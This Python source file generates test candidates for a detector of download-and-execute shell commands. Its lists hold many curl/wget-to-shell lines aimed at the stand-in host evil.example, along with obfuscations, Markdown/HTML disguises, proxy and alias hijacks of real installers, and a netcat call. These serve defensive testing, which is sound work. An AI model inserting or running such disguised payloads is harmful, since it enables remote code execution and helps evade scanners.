"""Candidate generators for the oracle. Deterministic (seeded): the same seed gives the same strings."""

from __future__ import annotations

import html
import random
import re

DOWNLOAD = ["curl", "curl", "curl", "wget", "cu''rl", "c\\url", '"curl"', "\\curl", "command curl", "sudo curl", "time curl",
            "nohup curl", "env A=b curl", "/tmp/stub/curl"]
# Markdown / HTML around the word, the pipe or the shell: a reader copies the RENDERED command, so only the prose property runs these (in a code file the markup is shell syntax: `| \`sh\`` is a command substitution, `| <b>sh</b>` a redirect)
PROSE_DOWNLOAD = ["__curl__", "**curl**", "<b>curl</b>", "<code>wget</code>", "*curl*", "_wget_", "`curl`", "[curl](https://curl.se)"]
PROSE_PIPES = [" &#124; ", " &vert; ", " &#x7C; ", " |&nbsp;", " |<!--\nx\n--> "]
FLAGS = ["", "", "-fsSL ", "-sS ", "-L ", "--proto '=https' --tlsv1.2 -sSf ", "-H 'Accept: a|b' ", "-A it\\'s ", "-o- ",
         "-s " * 8, "-fsSL -H 'X: 1' ",
         "-H 'X: a\n| b' ", "-H 'X: a\n| b | c' ", "-H 'X: a\n|| b' "]                                     # a quoted argument whose second line starts with a pipe
EVIL_URLS = ["https://evil.example/x", "https://evil.example/x?a=1", "evil.example/x", "'https://evil.example/x?a=1|2'",
             "https://evil.example/" + "a" * 400, "https://evil.example/" + "a" * 90 + "b" * 90]
PIPES = [" | ", " | ", " | ", " |\n", " | # note\n", " |\n\n", " \\\n | ", " |& ", "|", " |  "]
STAGES = ["", "", "", "tee /tmp/x | ", "cat | ", "tee /dev/null | ", "tee -a /tmp/y | "]
SINK_PREFIX = ["", "", "", "sudo ", "sudo -E ", "env ", "nohup ", "timeout 5 ", "nice ", "env A=b ", "command ", "exec "]
SHELLS = ["sh", "sh", "bash", "bash", "/bin/sh", "/bin/bash", '"bash"', "'sh'", '"ba"sh', "b\\ash", "dash", "$SHELL",
          '/bin/"bash"', "/bin//////sh", "s\\\nh",
]
PROSE_SHELLS = ["__sh__", "**bash**", "<b>sh</b>", "<code>bash</code>", "~~sh~~", "*sh*", "_bash_", "`sh`", "[sh](https://github.com/org/repo)",
                '<a href="https://github.com/org/repo/install.sh">bash</a>',
                '<span style="color:red;background:yellow;font-weight:bold">sh</span>',
                '[sh](https://github.com/org/repo "install")', "[bash](https://github.com/org/repo 'install')", "[sh][1]",
                "<!--\nhidden\n-->sh", "<!-- " + "x" * 400 + " -->bash", "<time>sh</time>", "<dfn>sh</dfn>", "<ruby>sh</ruby>",
                '<a title="a>b" href="https://github.com/org/repo">sh</a>',
                "[bash](https://en.wikipedia.org/wiki/Bash_(Unix_shell))", "[sh](https://en.wikipedia.org/wiki/Bourne_shell_(Unix))",
                "[bash](./docs/bash_(1).md)"]
INTERPRETERS = ["python3 -", "python3 -", "perl", "ruby", "node", "php", "python3.11 -", "python3 -u -",
                "python3 - a b c d e", "perl - a b c d e", "python3 - 1 2 3 4 5 6", "ruby - x y z w v"]
SHELL_ARGS = ["", "", "", " -s", " -s -- -y", " -x", " -e", " -o pipefail", " -", " -l", " -eu", " ; echo done", " && echo ok"]
SUBST = ['{sh} -c "$({d})"', "{sh} <({d})", "source <({d})", 'eval "$({d})"', ". <({d})", "{sh} -c `{d}`",
         'bash -euo pipefail -c "$({d})"', "{sh} -c \"$({d})\" _ --flag", "{sh} <<< \"$({d})\"", "bash --norc -c \"$({d})\"",
         # quotes and backslashes on the program, and one shell inside another
         '\\eval "$({d})"', '"eval" "$({d})"', "sh -c 'eval \"$({d})\"'", "\\source <({d})", '"." <({d})',
         # interpreters that read their program from a descriptor or from stdin
         "python3 <({d})", 'python3 - <<< "$({d})"', "perl <({d})", "ruby <({d})", "node <({d})", "php <({d})",
         "python3 -u <({d})", '"python3" - <<< "$({d})"', 'perl -e "$({d})"', 'python3 -c "$({d})"',
         '{sh} -c " $({d})"', 'eval " $({d})"']


def download(rng: random.Random, urls: list[str], prose: bool = False) -> str:
    url = rng.choice(urls)
    if prose and rng.random() < 0.1:
        url = f"<{url}>"                                     # an autolink: the reader copies the URL
    word, flags = rng.choice(DOWNLOAD + PROSE_DOWNLOAD if prose else DOWNLOAD), rng.choice(FLAGS)
    if "\n" in flags:
        word = rng.choice(["curl", "wget"])      # (a QUOTED download word with a multi-line quoted argument is an accepted miss)
    return f"{word} {flags}{url}"


def payload(rng: random.Random, prose: bool = False) -> str:
    """One candidate download-and-execute text (it may or may not really run a downloaded script: the oracle decides). `prose` adds the spellings that only mean something once Markdown and HTML are rendered."""
    dl = download(rng, EVIL_URLS, prose)
    if rng.random() < 0.3:
        return rng.choice(SUBST).format(sh=rng.choice(["sh", "bash", "/bin/bash", '"bash"']), d=dl)
    pipe = dl + rng.choice(PIPES + PROSE_PIPES if prose else PIPES) + rng.choice(STAGES)
    if rng.random() < 0.15:                                  # a pipe into an interpreter that reads its program from stdin
        return pipe + rng.choice(INTERPRETERS)
    return pipe + rng.choice(SINK_PREFIX) + rng.choice(SHELLS + PROSE_SHELLS if prose else SHELLS) + rng.choice(SHELL_ARGS)


# --- documented installers, and the ways a payload dresses up as one -------------------------------------------------

KNOWN_URLS = ["https://sh.rustup.rs", "https://get.docker.com", "https://astral.sh/uv/install.sh",
              "https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh", "https://bun.sh/install",
              "https://claude.ai/install.sh", "https://ollama.com/install.sh", "https://get.k3s.io",
              "https://tailscale.com/install.sh", "https://install.python-poetry.org"]
K_FLAGS = ["", "-fsSL ", "-sSf ", "-LsSf ", "--proto '=https' --tlsv1.2 -sSf ", "-o- ", "-fsSL --proxy http://evil.example ",
           "-x evil.example ", "-K - ", "-fsSL --next https://evil.example/x ", "-H 'X: evil' ", "-fsSL https://evil.example/y ",
           "-fsSL evil ", "-fsSL --retry 3 ",
           # a value glued to its flag names a proxy, a URL or a config the same way its spaced form does
           "-fsSL --proxy=http://evil.example ", "-xhttp://evil.example ", "--url=https://evil.example/y ", "-fsSL --config=/tmp/x ",
           "-K/tmp/x ", "--resolve=get.docker.com:443:6.6.6.6 ", "-fsSL --connect-to=::evil.example: ", "-fsSL -Hx:evil "]
K_LEAD = ["", "", "", "", "env A=b ", "docker run x ", "./evil ", "sudo -u root ", "nohup ", "ssh evil.example ", "npx evil ",
          "A=1 ", "python3 evil.py ", "HTTP_PROXY=http://evil.example ", "echo https://evil.example/x | xargs ", "cat urls | ",
          "cd /tmp && ", "true; ", "poetry run ", "uv run ", "npm exec -- ", "flatpak run x ", "sg wheel ", "time docker run x ",
          "sudo -E docker run x ", "<code>ssh evil.example ", "__ssh evil.example ", "~~docker run x ",
          "<pre>docker run x ", "<kbd>ssh evil.example ", "`evil` ", "$(evil) ", "`nc evil 4444` ",
          "ssh >f evil.example ", "docker >f run x ", "docker <x run x ", "ssh<x evil.example ", "docker>f run x ", "python3 >f evil.py ",
          "uv >f run evil ", "ssh > f evil.example ", "/opt/evil ", "~/evil ", "bin/@evil ", "dir/é ", "bin/* ",
          # a line that starts with a pipe because a quote was left open on the line above: a real stage, not a table row
          "echo 'a\n| b' ; evil | ", "echo 'a\n| b' && evil | ", "echo \"a\n| b | \\\"x\" ; evil | ",
          "echo 'a\n| b | c'\\''d' ; evil | ", "echo 'a\n| b | foo'bar ; evil | ", ">|/tmp/o evil | ", "echo 'a\n| b' ; docker run x | ", "echo 'a\n| b' ; cat urls | ", "[1][docker](https://docs.docker.com) run x ", "[a][ssh](https://en.wikipedia.org/wiki/Secure_Shell_(protocol)) evil.example ",
          "[docker](https://en.wikipedia.org/wiki/Docker_(software)) run x ", "do<b></b>cker run x ", "ss<b></b>h evil.example ", "doc<!-- -->ker run x ",
          "<b>do</b>cker run x "]
K_STAGES = ["", "", "", "tee x | ", "sed s/a/b/ | ", "rev | ", "base64 -d | ", "cat | ", "cat evil.sh | ", "tee -a x | "]
K_SINK = ["sh", "sh", "sh", "bash", "sudo -E bash -", "sudo bash -s", "sh -s -- -y", "bash -s stable", "python3 -", "sh -c 'evil'",
          "sh ./evil.sh", "env evil sh", "sudo ./evil sh", "sh -o pipefail ./evil.sh", "bash --rcfile ./evil.sh", "sh -s ./x",
          "python3 - --version 1.8.3", "python3 - --git https://evil.example/p.git", "python3 - --path /tmp/x",
          "python3 - --force --yes --preview --uninstall --git evil", "python3 - --force --yes --preview --uninstall --config evil", "perl # note", "python3 # note", '"perl"', "\\perl", "sh evil.sh.", "sudo -u root bash", "sh evil.sh", "bash e.py", "sh +x evil.sh", "bash +B ./evil.sh",
          "sh bin/evil", "sh a/b", "sh scripts/evil", "sh evil.run", "sh evil.json", "sh evil.sh-bak", "sh evil.ksh",
          "$SHELL", "exec $SHELL", "nice sh", "env -u X sh"]
K_AFTER = ["", "", "", "", "; evil", " && evil", " > /dev/null; evil", " # comment", " (macOS)", " 2>&1", " || evil", " `evil`"]
K_SUBST = ['{sh} -c "$({d})"', "{sh} <({d})", "source <({d})", 'eval "$({d})"', ". <({d})", '{sh} -c evil "$({d})"',
           '{sh} evil.sh <<< "$({d})"', "{sh} x.sh <({d})", '{sh} -c ./evil.sh <({d})', 'python3 e.py <<< "$({d})"',
           'bash -euo pipefail -c "$({d})"', "$SHELL -c \"$({d})\"", 'bash -c "$(\n{d}\n)"', "<pre>ssh evil.example {sh} -c \"$({d})\"</pre>",
           '{sh} -c "$(env A=b {d})"', 'python3 <({d})', 'python3 - <<< "$({d})"', "perl <({d})", "`evil` {sh} -c \"$({d})\"",
           '\\eval "$({d})"', "sh -c 'eval \"$({d})\"'",
           "ssh evil.example '\n{d} | {sh}\n'", "docker run x sh -c '\n{d} | {sh}\n'", "ssh evil.example <<'EOF'\n{d} | {sh}\nEOF",
           'ssh evil.example "\n{d} | {sh}\n"', 'docker run x sh -c "\n{d} | {sh}\n"',
           "ssh evil.example <<'EOF'\napt-get update\napt-get install -y git\nmkdir -p /opt/app\ncd /opt/app\nset -e\n{d} | {sh}\nEOF",
           "docker run x sh -c '\nset -e\napt-get update\napt-get install -y git\ncd /opt\nmkdir -p x\n{d} | {sh}\n'",
           "python3 <({d}) --git git@evil.example:x/y.git", "python3 <({d}) --path /tmp/x", 'python3 - <<< "$({d})" --git x']
_CLEAN = {"lead": "", "flags": "-fsSL ", "stage": "", "sink": "sh", "after": ""}


# Breadcrumbs (up to five levels) before the command, and what may start it: a program, a path, a wrapper with a glued operator
CRUMBS = ["| {x} |", "| Command |\n|---|\n| {x} |", "Terminal > {x}", "Settings > Terminal > {x}", "A > B > C > {x}", "A > B > C > D > {x}", "A > B > C > D > E > {x}",
          "Menu > Settings > Terminal > Shell > {x}"]
CRUMB_LEADS = ["~/evil ", "/opt/evil ", "./evil ", "docker>f run x ", "ssh>f evil.example ", "scripts/evil ", "docker run x ",
               "ssh evil.example ", "npx evil ", "ssh > f evil.example ", "python3 evil.py ", "sudo -u root ", ">|/tmp/o evil | ",
               ">|/tmp/o docker run x | "]


def documented(rng: random.Random, lead: str | None = None) -> str:
    """A documented installer command with at most ONE twist (a clean one is a real documented form). One twist at a time keeps most candidates close enough to the documented shape that the prose rules soften them, which is what is being tested."""
    parts = dict(_CLEAN)
    if rng.random() < 0.85:
        field = rng.choice(list(_CLEAN))
        parts[field] = rng.choice({"lead": K_LEAD, "flags": K_FLAGS, "stage": K_STAGES, "sink": K_SINK, "after": K_AFTER}[field])
    if lead is not None:
        parts["lead"] = lead
    dl = rng.choice(["curl", "curl", "wget"])
    flags = parts["flags"] if dl == "curl" else parts["flags"].replace("-fsSL", "-qO-")
    download_cmd = f"{dl} {flags}{rng.choice(KNOWN_URLS)}"
    if rng.random() < 0.3:
        return rng.choice(K_SUBST).format(sh=rng.choice(["bash", "sh", "bash", "/bin/bash"]), d=download_cmd) + parts["after"]
    return f"{parts['lead']}{download_cmd} | {parts['stage']}{parts['sink']}{parts['after']}"


CONTEXTS = ["{x}", "Run `{x}`", "$ {x}", "With curl: `{x}`", "| Linux | `{x}` |", "Install it: {x}", "1. `{x}` then reload",
            "Requires `curl`. Run `{x}` afterwards.", "<code>{x}</code>", "**{x}**", "*{x}*", "<pre>{x}</pre>", "[{x}]", "_{x}_",
            "Run \u201c{x}\u201d", "Run \u2018{x}\u2019", "Run \u00ab{x}\u00bb", "~~{x}~~",
            "\u5b89\u88dd\uff1a{x}", "\u57f7\u884c{x}", "\u8acb\u57f7\u884c{x}\u7136\u5f8c\u91cd\u555f", "{x}\u7136\u5f8c", "\u00e9{x}",
            "Run:{x}", "__{x}__", "Terminal > {x}", "Settings > Terminal > {x}", "A > B > C > D > {x}", "A > B > C > D > E > {x}", "\u5b89\u88dd:{x}", "Then Run:{x}", "Step 1:{x}",
            "1){x}", "a){x}", "[1]{x}", "A.{x}", "=>{x}", "(a){x}", "i){x}", "Step-1:{x}", "Step_1:{x}", "macOS13:{x}",
            # what GitHub itself renders around a code block: long attributes (a documented installer in them is still documentation)
            "<li>docker<br><code>{x}</code></li>", "docker<br><pre>{x}</pre>", "| docker | <code>{x}</code> |", "| Linux | {x} |", "| Command |\n|---|\n| <code>{x}</code> |", "| Command |\n|---|\n| {x} |", "| docker | `{x}` |\n| uv | <code>{x}</code> |",
            "| Tool | Command |\n|---|---|\n| docker | <code>{x}</code> |\n| uv | <code>{x}</code> |", "| docker | <code>{x}</code> |\n\nDone.",
            "<b>docker</b>&nbsp;<code>{x}</code>", "<b>docker</b> &mdash; <code>{x}</code>",
            "<h3>Install</h3>{x}", "Install<br>{x}", "<td>Linux</td><td>{x}</td>", "<li>Install</li>{x}",
            "<details><summary>Install</summary>{x}</details>", "<td>uv</td><td><code>{x}</code></td>", "<b>docker</b>: <code>{x}</code>",
            '<pre>{x}</pre><div class="zeroclipboard-container"></div>',
            '<code class="language-bash hljs" data-highlighted="yes">{x}</code>',
            '<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>{x}</pre></div>']
# A relative path with a slash is a program only as the first word of the text (`Run scripts/evil curl …` cannot be told from prose, and a path in typographic quotes, emphasis or a tag is text): the leads that are such paths go only into the contexts that leave them the first word.
RELATIVE_LEADS = ("bin/@evil ", "dir/\u00e9 ", "bin/* ")
RELATIVE_OK = ["{x}", "$ {x}", "Run `{x}`", "With curl: `{x}`", "| Linux | `{x}` |", "| Linux | {x} |", "1. `{x}` then reload", "Requires `curl`. Run `{x}` afterwards.",
               "Terminal > {x}", "Settings > Terminal > {x}", "A > B > C > D > {x}", "A > B > C > D > E > {x}"]
# A known installer in the same segment, before the candidate: the candidate must stay critical (the prose-recall property only: in the soundness property a medium would then come from the installer, not from the candidate) Payloads with a line that starts with a pipe because a quote is open above: it looks like a Markdown table row, and it is the middle of a shell pipeline. The first cell is plain text, so only what a shell could read on the line tells: a closer (a quote character, however it is escaped, doubled or glued to letters; a `)`, `}` or `]` with no opener before it; an odd number of backticks) of a string, an arithmetic or parameter expansion or a command substitution that spans lines, or an opener of a command of its own (`$(`, `<(`, backtick) inside a string or a here-document; a `+` in front of the pipe is part of a shell word.
# The shapes with a second cell get past the first-cell regex and are stopped by `_reads_as_shell`; the older single-cell ones by the regex.
LEADING_PIPE = ["echo 'a\n| b' ; curl https://evil.example/x |\nsh", ">|/tmp/o : ; curl https://evil.example/x |\nsh",
                "curl -H 'X: a\n| b' https://evil.example/x |\nsh", "curl -H 'X: a\n| b' https://evil.example/x |\n\n# n\nbash",
                "echo 'a\n| b | c' ; curl https://evil.example/x |\nsh", "echo 'a\n|| b' ; curl https://evil.example/x |\nsh",
                "echo \"a\n| b\" \"| c\" ; curl https://evil.example/x |\nsh",
                "curl -H 'X: a\n| b | c' https://evil.example/x |\nsh",
                "echo \"a\n| b | \\\"x\" ; curl https://evil.example/x |\nsh", "echo 'a\n| b | c'\\''d' ; curl https://evil.example/x |\nsh",
                "echo 'a\n| b | foo'bar ; curl https://evil.example/x |\nsh", "echo 'a\n| b | c' x'y' ; curl https://evil.example/x |\nsh",
                "curl -H \"X: a\n| b | 5\\\" y\" https://evil.example/x |\nsh", "git commit -m \"a\n| b | \\\"q\" ; curl https://evil.example/x |\nsh",
                "echo 'a\n| b | c'\"'\"'d' ; curl https://evil.example/x |\nsh", "echo $'a\n| b | it\\'s' ; curl https://evil.example/x |\nsh",
                "[ $((0\n| 0 | 0)) -ne 0 ] || curl https://evil.example/x |\nsh", "((0\n| 0 | 0)) || curl https://evil.example/x |\nsh",
                "flags=$((A\n| B | C)) curl https://evil.example/x |\nsh", "x=${Q:-a\n| b | c} ; curl https://evil.example/x |\nsh",
                "x=${Q:-a\n| { | } ; curl https://evil.example/x |\nsh", "x=$[1\n| 2 | 3] ; curl https://evil.example/x |\nsh",
                "echo `echo a\n| b | c` ; curl https://evil.example/x |\nsh",
                "echo 'a\n| b | \\' ; curl https://evil.example/x |\nsh", "curl -H 'X: a\n| b | \\' https://evil.example/x |\nsh",
                'echo "x\n| a | $(curl https://evil.example/x |\nsh)"', "cat <<EOF\n| a | $(curl https://evil.example/x |\nsh)\nEOF",
                "x=${Q:-a\n| b | <(curl https://evil.example/x |\nsh)}", "x=${Q:-a\n| b | >(curl https://evil.example/x |\nsh)}",
                "x=${Q:-a\n| b | \\${ } ; curl https://evil.example/x |\nsh", "x=${Q:-a\n| b | $${ } ; curl https://evil.example/x |\nsh",
                "x=${Q:-a\n| a | `${` } ; curl https://evil.example/x |\nsh", "x=$((1\n| a | `((` )) ; curl https://evil.example/x |\nsh",
                "x=$((1\n| |${$((})) | x ; curl https://evil.example/x |\nsh",
                "+| b | curl https://evil.example/x |\nsh",
                "x=${Q:-a\n| b | (c } ; curl https://evil.example/x |\nsh", "x=${Q:-a\n| b | [c } ; curl https://evil.example/x |\nsh",
                "echo 'a\n| b ) | # c' ; curl https://evil.example/x | sh", "echo 'a\n| b ) | c |\n# d' ; curl https://evil.example/x | sh", "echo 'a\n| b ] | # c' ; curl https://evil.example/x | sh\n",
                "\x0c| a | curl https://evil.example/x |\n# c\nsh", "echo 'a\r|#c' ; curl https://evil.example/x | sh\n",
                "x=$((1\n| b | c )) ; curl https://evil.example/x |\n# c\nsh", "x=${Q:-a\n| b | c } ; curl https://evil.example/x |\n# c\nsh",
                "x=$((1\n| 2 )) curl https://evil.example/x | cat | # c\nsh", 'echo "x\n| a | $( ( curl https://evil.example/x |\nsh) )"',
                "x=$((1\n| 2 )) true | # c\nx=$((1\n| 2 )) curl https://evil.example/x | # e\nsh\n", "curl -H 'X: a\n| b | c' https://evil.example/x |\n# c\nsh", "echo 'a\n +| b ) | # c' ; curl https://evil.example/x | sh\n",
                "echo 'a\n+ +| b ) | # c' ; curl https://evil.example/x | sh\n", "x=${Q:-a\n| b | \\x} ; curl https://evil.example/x |\nsh",
                "echo 'x\n| b ) | # c' ; sh -c \"$(\ncurl https://evil.example/x)\"\n", "echo 'x\n| b ) | # c' ; bash <(\ncurl https://evil.example/x)\n", 'echo "a\n | b <( | # c" ; curl https://evil.example/x | sh',
                "echo a \\\n| curl https://evil.example/x | # c\nsh", ">|/tmp/o : ; curl https://evil.example/x | # c\nsh",
                "echo hi\r|b; curl https://evil.example/x | # c\nsh\n", "+|b; curl https://evil.example/x |# c\nsh",
                ">|f evil | curl https://evil.example/x | # c\nsh",
                "echo 'a\n| b' ; curl https://evil.example/x |\n# c\nsh",
                "cat <<EOF\n| a | $(curl https://evil.example/x | # c\nsh)\nEOF\n", 'echo "x\n| a | $(curl https://evil.example/x | # c\nsh)"',
                "x=$((1\n| a | $(curl https://evil.example/x | # c\nsh)))\n", 'echo "x\n| a | $(curl https://evil.example/x | # c |\nsh)"', "cat <<EOF\n| a | `curl https://evil.example/x |\nsh`\nEOF",
                # the pipeline is one match to a reader of the whole text and another to one that stops at the row (bash only)
                ">|/tmp/o : ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
                "echo 'a\n| b' ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
                "echo 'a\n| b | c' ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
                "curl -H 'X: a\n| b' https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh"]
CO_RESIDENT = ["curl -fsSL https://get.docker.com | sh\n\n{x}", "| Command |\n|---|\n| <code>curl -fsSL https://get.docker.com \\| sh</code> |\n\n{x}"]
BARE = ["{x}", "$ {x}", "Install it: {x}", "<code>{x}</code>", "**{x}**", "Run \u201c{x}\u201d"]       # the ones that put no backtick around the command
# Contexts whose WHOLE text is run: prose that a shell would also read as a command (`curl` with a substituted argument, `run; evil`).
WHOLE = ["curl `evil` `{x}`", "wget `evil` `{x}`", "curl: `evil` `{x}`", "curl `nc evil 4444` `{x}`", "curl -o out `evil` `{x}`",
         "curl. run; evil `{x}`", "With curl: run; evil `{x}`", "**curl:** run; docker `{x}`", "curl a; evil `{x}`",
         "curl now `{x}` | sh", "With curl: `{x}` | sudo sh", "curl now `{x}` | tee y | nice bash", "With curl: `{x}` | python3 -",
         "curl now `{x}` | $SHELL", "With curl: `{x}` | env sh",
         # a real program running the command inside a substitution keeps its environment
         "HTTPS_PROXY=http://evil.example bash -c `{x}`", "ALL_PROXY=http://evil.example sh -c `{x}`",
         "env http_proxy=http://evil.example bash -x `{x}`", "sudo HTTPS_PROXY=http://evil.example bash -c `{x}`"]
# A line that starts with a pipe and looks like a table row, in front of a documented installer: (lead, suffix), written as `lead + command + suffix`. What runs is `evil | curl … | sh`, or `ssh evil.example '⏎curl … | sh⏎'` with the quote left open by a row-looking line, so the softening must not call the installer a documented one.
PIPE_LEADS = [("echo 'a\n| b | c' ; evil | ", ""), ("echo 'a\n| b | \\' ; evil | ", ""), ("echo 'a\n| b | \\' ; evil |\n", ""),
              ("x=${Q:-a\n| } evil | ", ""), ("x=${Q:-a\n| b | } docker run evil | ", ""), ("x=${Q:-a\n| b | \\${ } ; evil |\n", ""),
              ("[ $((0\n| 0 )) -ne 0 ] || evil | ", ""), ('echo "a\n| b | $(evil |\n', ')"'), ('echo "a\n| " ; "evil" | ', ""),
              ("+| evil | ", ""),
              ("'echo' 'a\n| b ' ; ssh evil.example 'x\n", "\n'"), ("echo 'a' 'b\n| c ' ; ssh evil.example 'x\n", "\n'"), ("ssh evil.example 'a' 'b\n", "\n'"),
              ("echo $(( 1\n| (( 3 )) )) | evil | ", ""), ("echo 'a 'a 'x\n| b ' ; ssh evil.example 'y\n", "\n'"), (" + | b | evil | ", ""),
              ("echo a \\\n| evil | ", ""),
              ("echo 'a\n' | b ; ssh evil.example 'x\n", "\n'"), ("echo 'a\n| b'c ; ssh evil.example 'x\n", "\n'"),
              ('echo "a\n| b \\" c" ; ssh evil.example "x\n', '\n"'), ("echo $'a\n| b \\' c' ; ssh evil.example 'x\n", "\n'"),
              ("echo 'a\n\n| b' ; ssh evil.example 'x\n", "\n'"), ("echo 'a\n> | b' ; ssh evil.example 'x\n", "\n'"), ("echo 'a\n+| b' ; ssh evil.example 'x\n", "\n'"),
              ("+| b | evil |\n", ""), ('echo "a \'b\n| b" ; ssh evil.example "x\n', '\n"')]
PROLOGUE = ["", "", "", "", "alias sh=evil\n", "alias bash=evil\n", "export PATH=/tmp/x:$PATH\n", "PATH=/tmp/x:$PATH\n",
            "function curl { evil; }\n", "curl() { evil; }\n", "alias curl='evil'\n", "function sh { evil; }\n", "HOME=/tmp/evil\n",
            "al<b></b>ias curl='evil'\n", "ali<!-- -->as sh=evil\n", "ex<b></b>port PATH=/tmp/x:$PATH\n"]


_BLOCK = "br|hr|p|pre|div|li|ul|ol|dl|dt|dd|td|th|tr|table|tbody|thead|tfoot|h[1-8]|summary|details|blockquote|caption|figure|figcaption|center|section"
_TAGS = ("a|abbr|b|bdo|big|blockquote|br|caption|center|cite|code|dd|del|details|dfn|div|dl|dt|em|figcaption|figure|font|h[1-8]|hr|i|img|"
         "ins|kbd|li|mark|ol|p|pre|q|rp|rt|ruby|s|samp|small|span|strike|strong|sub|summary|sup|table|tbody|td|tfoot|th|thead|time|tr|tt|u|ul|var|wbr")


def rendered(text: str) -> str:
    """What a reader (and a shell) sees once Markdown and HTML have been rendered, written without the code under test: entities decoded, comments and the usual tags gone whatever their attributes, a link (with a title, or by reference) shows its text, an autolink is its URL, emphasis markers that are not inside an identifier are gone, a word in backticks is the word."""
    text = html.unescape(text).replace("\xa0", " ")
    text = re.sub(r"<!--.*?-->", "", text, flags=re.DOTALL)
    text = re.sub(rf"</?(?:{_BLOCK})(?![A-Za-z0-9:-])(?:\s(?:\"[^\"]*\"|'[^']*'|[^<>\"'])*)?/?>", "\n", text, flags=re.IGNORECASE)    # a block ends the line
    text = re.sub(r"<code(?:\s(?:\"[^\"]*\"|'[^']*'|[^<>\"'])*)?>([^<`]*)</code>", r"`\1`", text, flags=re.IGNORECASE)    # an inline code span
    text = re.sub(rf"</?(?:{_TAGS})(?:\s(?:\"[^\"]*\"|'[^']*'|[^<>\"'])*)?/?>", "", text, flags=re.IGNORECASE)
    text = re.sub(r"!?\[([^\[\]\n]+)\](?:\((?:\"[^\"\n]*\"|'[^'\n]*'|\([^()\n]*\)|<[^<>\n]*>|[^()\n\"'<])*\)|\[[^\[\]\n]*\](?!\())", r"\1", text)
    text = re.sub(r"<(https?://[^\s<>]+)>", r"\1", text)
    text = re.sub(r"(?<![A-Za-z0-9])(?:[*_]+|~{2,})|(?:[*_]+|~{2,})(?![A-Za-z0-9])", "", text)         # emphasis, nested or not; not `my_curl`
    return re.sub(r"(?<![A-Za-z0-9_`])`([^\s`]+)`(?![A-Za-z0-9_`])", r"\1", text)
